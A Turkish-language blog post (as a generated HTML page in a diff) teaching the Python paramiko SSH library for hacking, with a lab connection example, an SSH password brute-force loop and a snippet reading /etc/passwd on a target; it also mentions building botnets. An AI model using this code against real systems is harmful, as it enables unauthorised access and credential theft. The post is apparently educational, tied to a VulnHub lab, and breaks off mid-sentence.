@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Hakerlar için Python: paramiko · Yusuf Talha ARABACI
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Talha ARABACI">
+<meta name="description" content="
+  te: 2022-09-26
+draft: false
+  
+    
+    Başlık Linki
+  
+
+
+
+  Hakerlar için Python: paramiko
+  
+    
+    Başlık Linki
+  
+
+
+
+  Giriş
+  
+    
+    Başlık Linki
+  
+
+Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+
+  paramiko nedir?
+  
+    
+    Başlık Linki
+  
+
+SSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
+  <meta name="twitter:title" content="Hakerlar için Python: paramiko">
+  <meta name="twitter:description" content="te: 2022-09-26 draft: falseBaşlık LinkiHakerlar için Python: paramikoBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+paramiko nedir?Başlık LinkiSSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
+
+<meta property="og:url" content="http://localhost:1313/tr/posts/2022/09/hakerlar-i%C3%A7in-python-paramiko/">
+  <meta property="og:site_name" content="Yusuf Talha ARABACI">
+  <meta property="og:title" content="Hakerlar için Python: paramiko">
+  <meta property="og:description" content="te: 2022-09-26 draft: falseBaşlık LinkiHakerlar için Python: paramikoBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan paramiko modülünü tanıyacağız.
+paramiko nedir?Başlık LinkiSSH (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.">
+  <meta property="og:locale" content="tr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-09-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-09-26T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/profile.jpeg">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/tr/posts/2022/09/hakerlar-i%C3%A7in-python-paramiko/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/tr/">
+      Yusuf Talha ARABACI
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/posts/">Yazılar</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/series/">Seriler</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/about/">Hakkımda</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/posts/2022/09/python-for-hackers-paramiko/">English</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/tr/posts/2022/09/hakerlar-i%C3%A7in-python-paramiko/">
+              Hakerlar için Python: paramiko
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-09-26T00:00:00Z">
+                Eylül 26, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3 dakikalık okuma
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <h2 id="draft-false">
+  te: 2022-09-26
+draft: false
+  <a class="heading-link" href="#draft-false">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h2>
+<hr>
+<h3 id="hakerlar-için-pythonparamiko">
+  <strong>Hakerlar için Python: paramiko</strong>
+  <a class="heading-link" href="#hakerlar-i%c3%a7in-pythonparamiko">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><img src="/images/1_cHmfmYLtoze7wtcUFY5BVA.png" alt=""></p>
+<h3 id="giriş">
+  Giriş
+  <a class="heading-link" href="#giri%c5%9f">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Merhaba, bu yazımda Python ile SSH bağlantıları kurmamızı sağlayan <em>paramiko</em> modülünü tanıyacağız.</p>
+<h3 id="paramiko-nedir">
+  paramiko nedir?
+  <a class="heading-link" href="#paramiko-nedir">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><strong>SSH</strong> (Secure Shell), ağ hizmetlerinin güvenli olmayan bir ağ üzerinde güvenli şekilde çalıştırılması için kullanılan bir kriptografik ağ protokolüdür. SSH ile ağ cihazlarınıza, linux ve windows makinelere bağlanabilir ve onları yönetebilirsiniz. Ön tanımlı olarak 22 portunda çalışır.</p>
+<p>Paramiko Python ile SSH bağlantılarını kolaylıkla yapmamızı sağlayan bir modüldür. Bu sayede Python ile uzak sunucuları yöneten uygulamalar yazabiliriz. Örneğin; bir botnet kurabilir, uzak bir sunucu üzerinde zararlı yazılım çalıştırabilir ya da SSH zafiyetlerini tarayan uygulamalar yazabiliriz. Şimdi bu modülü nasıl kullanacağımıza bir bakalım.</p>
+<h3 id="kurulum">
+  Kurulum
+  <a class="heading-link" href="#kurulum">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Paramiko kurulumu için aşağıdaki aşağıdaki kodu terminal ekranında çalıştırınız.</p>
+<pre tabindex="0"><code>pip install paramiko
+</code></pre><p>Ardından bir python dosyası açıp modülü projemize dahil edebiliriz.</p>
+<pre tabindex="0"><code>import paramiko
+</code></pre><p>şimdi paramiko modülü ile bir SSH bağlantısı yapalım</p>
+<h3 id="paramiko-modülü-nasıl-kullanılır">
+  Paramiko Modülü nasıl kullanılır?
+  <a class="heading-link" href="#paramiko-mod%c3%bcl%c3%bc-nas%c4%b1l-kullan%c4%b1l%c4%b1r">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Paramiko modülü ile SSH bağlantısı kurmak için;</p>
+<pre tabindex="0"><code>import paramiko
+</code></pre><pre tabindex="0"><code>IP = &#34;ip adresi&#34;  
+USERNAME = &#34;kullanıcı adı&#34;  
+PASSWORD = &#34;şifre&#34;  
+PORT = 22  
+COMMAND = &#34;komut&#34;
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  # SSH nesnesi oluşturma  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+</code></pre><pre tabindex="0"><code>ssh.connect(ip, username, password) # SSH bağlantısını kurma  
+stdin, stdout, stderr = ssh.exec_command(command) # Komut çalıştırma  
+print(stdout.read())
+</code></pre><pre tabindex="0"><code>ssh.close()
+</code></pre><p>Bu örnekte pramaiko modülü ile bir SSH client’ı oluşturduk. Uygulama belirtilen ip ve port adresine kullanıcı adı ve parola bilgileri ile bir bağlantı gerçekleştirir ve ‘whoami’ komutunu çalıştırır. Ardından dönen cevabı ekrana yazdırır ve SSH bağlantısını kapatır.</p>
+<p><img src="/images/1_yht4td7gjtuSn40eYD1_mQ.png" alt=""></p>
+<p>Bu örnekte, sanal ortamda <a href="https://www.vulnhub.com/entry/typhoon-102,267/"  class="external-link" target="_blank" rel="noopener">Typhoon</a> makinesini çalıştırarak SSH ile bağlandık. Şimdi bu modül ile daha neler yapabileceğimize bir bakalım.</p>
+<h3 id="ssh-brute-force-saldırısı">
+  SSH brute force saldırısı
+  <a class="heading-link" href="#ssh-brute-force-sald%c4%b1r%c4%b1s%c4%b1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Paramiko ile SSH bağlantısı yapabilediğimize göre bir kabaa kuvvet saldırısı da yapabiliriz. Bunun için bir kullanıcı adı listesi bir de parola listesi oluşturacağız. Ardından bu listedeki bilgiler ile SSH bağlantısı kurmaya çalışacağız.</p>
+<pre tabindex="0"><code>import paramiko
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+username_list = []  
+password_list = []
+</code></pre><pre tabindex="0"><code>for i in username_list:  
+    for j in password_list:  
+        try:  
+            ssh.connect(ip,username=i, password=j)  
+            print(i,j)  
+            ssh.close()  
+        except:  
+            pass
+</code></pre><p>Yukarıdaki kodda saldırı için bir kullanıcı adı listesi bir de parola listesi gerekmektedir, bunları koddaki listelere ekleyebilirsiniz. Hedef ip adresi de ssh.connect() fonskiyonuna verilmelidir. Ardından kod çalıştırıldığında, ilgili ip adresine kullanıcı adı ve parola listelerindeki değerler teker teker denenir. Bu işlemde hedef sunucuda SSH servisinin açık olduğundan emin olun. Aksi takdirde, işlem başarısız olacaktır.</p>
+<h3 id="passwd-dosyasını-çekme">
+  Passwd dosyasını çekme
+  <a class="heading-link" href="#passwd-dosyas%c4%b1n%c4%b1-%c3%a7ekme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>SSH bağlantısını sağladığımız taktirde, hedef sunucudan aldığımız shell ile istediğimiz işlemi yapabiliriz. Bunun için <em>ssh.exec_command()</em> metodunu kullanırız.</p>
+<pre tabindex="0"><code>import paramiko
+</code></pre><pre tabindex="0"><code>ssh = paramiko.SSHClient()  
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
+ssh.connect(ip, username, password)  
+stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
+print(stdout.read().decode(‘ascii’))
+</code></pre><p>Yukarıdaki kod ile hedef sunucunun <em>passwd</em> dosyasını okuyup ekrana yazdırdık.</p>
+<h3 id="son">
+  Son
+  <a class="heading-link" href="#son">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Sonuç olarak, paramiko modülü ile uzak sunuculara SSH bağlantısı yaptık ve sunucular üzerinde komut çalıştırdık. Paramiko ile başka ne tür uygulamalar</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Talha ARABACI 
+    ·
+    
+    Site program altyapısı <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
